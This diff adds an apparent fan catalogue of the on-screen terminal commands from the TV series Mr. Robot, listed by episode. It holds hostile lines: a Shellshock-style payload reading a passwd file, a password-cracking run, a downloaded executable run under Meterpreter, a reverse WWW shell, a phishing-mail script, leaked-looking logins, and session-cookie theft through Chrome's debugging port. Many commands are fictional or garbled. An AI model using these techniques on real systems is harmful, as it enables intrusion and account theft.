@@ -1,0 +1,308 @@
+#!/bin/rbt
+S1
+--------
+EP.1 
+--------
+$: Map sectionus34567
+$: Locate server WBKUW300PS345672
+$: astsu - info -backup -short
+$: Set waneth0* : 23.234.45.1 255.255.255.0
+$: astsu -open port: * -persistent
+$: astsu - ifconfig* - enable
+$: locate server WBKUW300PS345672
+$: ps aux|grep root
+$: astu trace -pid 244 -cmd
+$: astu -ls ./root/fsociety/ -a
+$: fsociety00.dat
+$: more readme.txt
+$: sudo kill 4
+$: astu -rm -norecycle /root/ fsociety/
+$: chmod -R ER280652 600
+
+$:elpscrk -List pswlist.? ?st-add 2c;Yankees:Flipper
+$:elpscrk -ip 222.12.154.102 -p?
+--------
+EP.2
+--------
+$: wget -U "() [test;];echo \"Content-type: text/plain\"; echo; echo;
+   /bin/cat /etch/passwd" http://evilcorp-intl.com/login.email.srf?wa=
+   wsignin1.0&rpsnv=4d
+$: cat status
+$: ./john /etc/status
+--------
+EP.3
+--------
+nocmds
+--------
+EP.4
+--------
+--------
+EP.5
+--------
+EP.6
+--------
+$: ssh 223.200.172.203
+
+vera
+term1
+$: gcc -  lbluetooth - lcurses csr_sniffer.c.o bluesniff 
+$: dir bluesniff- csr_sniffer.c csr_sniffer.c~
+$: bluesniff
+$: bluesniff -d hcil
+$: bluesniff -d hcil -s
+$: bluesniff -d hcil -f 7
+$: bluesniff -d hcil -s 23:9A:38:07:79:DC@93:BE:85:93:3D:43
+term2
+$: hcitool inq
+term3 
+$: hciconfig hci0 up
+$: hciconfig hci1 up
+$: hciconfig
+
+cmd
+C:\> ftp root:184.51.150.177
+User <184.51.150.177> Root
+ftp> get PLCpackage.exe c:\tmp\PLCpackage.exe
+Meterpreter > run \tmp\PLCpackage.rb 
+--------
+EP.7
+--------
+--------
+EP.8
+--------
+$: gnome-open /home/VMShare 
+--------
+EP.9
+--------
+--------
+EP.10
+--------
+S2
+--------
+EP.1
+--------
+$: ssh -l root bkuw300ps345672-cs30.serverfarm.evil-corp-usa.com
+$: cd /opt/2/task/2/fd1nfo/fsociety/hscripts/
+$: ls
+$: ./fuxsocy.py
+$:
+--------
+EP.2
+--------
+EP.3
+--------
+EP.4
+--------
+$: BitchX
+--------
+EP.5
+--------
+$: sudo bash
+$: cd /tmp
+$: vim /working_dir/exploit_payload
+
+Let Me drive - TC -
+$: cd /var/www/marketplace
+$: ls
+$: ./decrypt_databases
+$: ./enable_maintenance_mode
+--------
+EP.6
+--------
+EP.7
+--------
+$: nano /etc/nginx/sites-available/marketplace
+$: ln -s /etc/nginx/sites-available/marketplace 
+         /etc/nginx/sites-enabled/hidden_service 
+$: service nginx restart
+$:
+--------
+EP.8
+--------
+EP.9
+--------
+$: sh /storage/emulated/legacy/Android/CrackSIM
+$: ./Pwnphone
+--------
+EP.10
+--------
+$: scanimage --format=tiff > scannedexigentform.tiff
+$: sendfax -f "US Mobile Law Enforcement" -r "Exigent Circumstance form" -X "NYPD"
+   -x "US Mobile" -d 2125550
+$: faxstat -s
+--------
+EP.11
+--------
+EP.12
+--------
+$: shred -vzn3 apc_hw05...
+--------
+S3
+--------
+EP.1
+--------
+$: perl rwwwshell-2.0.pl master
+$: ls
+$: shred -f -n 3 *
+--------
+EP.2
+--------
+$: tail results.txt
+$: ?
+$: cfgpower -all
+$: upsfwupdate -lastresult
+$: mount --rbind /sys /mnt/sys
+$: mount --rbind /dev /mnt/dev
+$: chroot /mnt /bin/bash
+$: rkhunter --check
+--------
+EP.3
+--------
+EP.4
+--------
+EP.5
+--------
+$: cd /usr/local/logstash-ups
+$: ls
+--------
+EP.6
+--------
+$: gpg --verify update.bin.asc update.bin
+$: shred -uzn3 update*
+$: wget -q https://192.251.68.232/files/ups_640_patch.zip
+$: unzip ups_fw_patch.zip
+$: gpg --verify hashes.asc
+$: sha256sum --check hashes.asc
+$: scp * upsadmin@192.251.68.229:/upsfw
+$: ssh upsadmin@192.251.68.229
+$: upsfwupdate 
+$: wget -q --show-progress https://192.251.68.232/files/ups_640_patch.zip
+$: ls
+$: unzip ups_fw_patch.zip
+$: gpg --verify hashes.asc
+$: sha256sum --check hashes.asc
+$: scp apc* upsadmin@192.251.68.229:/upsfw
+$: ssh upsadmin@192.251.68.229
+$: upsfwupdate
+$: firewall -f fw.fwl
+$: firewall -r
+$: exit
+--------
+EP.7
+--------
+EP.8
+--------
+EP.9
+--------
+EP.10
+--------
+$: python getlyrics.py -m artist -i artists.txt -o lyrics.txt
+$: bruteforce -l
+$: cryptsetup luksOpen ~/keyintercept_1.raw
+$: lsblk
+$: cd /media/root/9bd16a7a-cc3d-4a6e-8c19-ebe779a774f4/
+$: ls
+$: less keylog.txt
+--------
+S.4
+--------
+EP.1
+--------
+EP.2
+--------
+EP.3
+--------
+$: net user
+$: net user Olivia *
+$: ffpass import --from /dev/sdx/0_Cortez_p
+$: iceweasel&
+$: 
+--------
+EP.4
+--------
+EP.5
+--------
+EP.6
+--------
+EP.7
+--------
+EP.8
+--------
+EP.9
+--------
+$: subl &
+$: ffpassimport--from /tmp/passport/T_Wellick_passwords.csv
+$: iceweasel&
+
+$: run
+$: run > ~/gallatin.txt 
+$: exit
+
+$: sendph1shmail.py -f proclaimse@riseup.net -r gallatin.txt -s URGENT: A Flaw in SSL Has Been Detected, VPN Login Required
+
+$: openvpn - -config 192.251.68.142.ovpn
+$: Mason.erikston@abbott.communications.com
+$: **********
+$: openvpn - -config 192.251.68.142.ovpn
+$: Maria.vennuto@globles-cassius.com
+$: ************
+$: openvpn - -config 192.251.68.142.ovpn
+$: jzundermann@gallatintelco.com
+$: *****************
+$: openvpn - -config 192.251.68.142.ovpn
+$: Prescott.pannatahari@globes-cassius.com
+$: **********
+$: openvpn - -config 192.251.68.142.ovpn
+$: nmguparti@abbott-communications.com
+$: nodiggity!
+$: openvpn - -config 192.251.68.142.ovpn
+$: emurabahti@gallatintelco.com
+$: QS2d77FUGE
+
+$: ss7trace
+$: tcpdump -s 0 port ftp or ssh -i
+$: wireshark IMSI.pcap
+--------
+EP.10
+--------
+EP.11
+--------
+EP.12
+--------
+$: resetpassword
+$: /sbin/mount-uw/
+$: rm/var/db/.setupdone
+$: sudo -s root
+$: su - elliot
+$: /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \ -- headless 
+   \ --user-data-dir="$HOME/Library/Application Support/Google/Chrome/" \https://
+   gmail.com \ --remote-debugging-port=9222
+$: curl -s localhost:9222/json | { "description": "", "devtoolsFrontBABCE1BA",
+   "id": "740BF41DC4E7512E7512E0431577BABCE18A", "title": "about:blank", "type": 
+   "page", endUrl": "/devtools/inspector.html?ws=localhost:9222/devtools/page
+   /740BF41DC4E7512E7512E0431577 "url": "about:blank", "webSocketDebuggerUrl": 
+   "ws://localhost:9222/devtools/page/740BF41DC4E7512E7512E0431577BABCE1BA" }
+$: wsc ws://localhost:9222/devtools/page/740BF41DC4E7512E7512E0431577BABCE1BA 
+   & Connected to ws://localhost:9222/devtools/page
+   /740BF41DC4E7512E7512E0431577BABCE1BA> {"id" 1, "method": "Network.getAllCookies"}
+   i{ { "domain": "protonmail.com", "expires": -1, "httpOnly": false, "name": 
+   "PROTONMAIL_AT", "path": "/mail/u/0", "secure": true, "session": true, "size": 42,	"value": <+HFz36pPC6vf> },  
+   i{ "domain": "facebook.com", "expires": -1, "httpOnly": false, "name": 
+   "FACEBOOK_AT", "path": "/mail/u/0", "secure": true, "session": true, "size": 42,	"value": <Zw7EAvMA> }, 
+   i{ "domain": "linkedin.com", "expires": -1, "httpOnly": false, "name": 
+   "LINKEDIN_AT", "path": "/mail/u/0", "secure": true, "session": true, "size": 42,	"value": <sTA28mbz^&> }, 
+   i{ "domain": "instagram.com", "expires": -1, "httpOnly": false, "name": 
+   "INSTAGRAM_AT", "path": "/mail/u/0", "secure": true, "session": true, "size": 42,	"value": <$hdEsv29325@!>
+$: cd /Volumes
+$: diskutil list
+$: sudo mkdir /Volumes/TMPfsoc
+$: sudo mount -t hfs /dev/desk1 /Volumes/TMPfsoc
+$: touch /tmp/passwordcracker.sh
+$: pico /tmp/passwordcracker.sh
+$: tmp/passwordcracker.sh /dev/disk1 passwords.list --?
+$: cd /Volumes/TMPfsoc/
+$: ls /Volumes/TMPfsoc/
+$: open fxsocy.jpeg
+--------
+EP.13
+--------
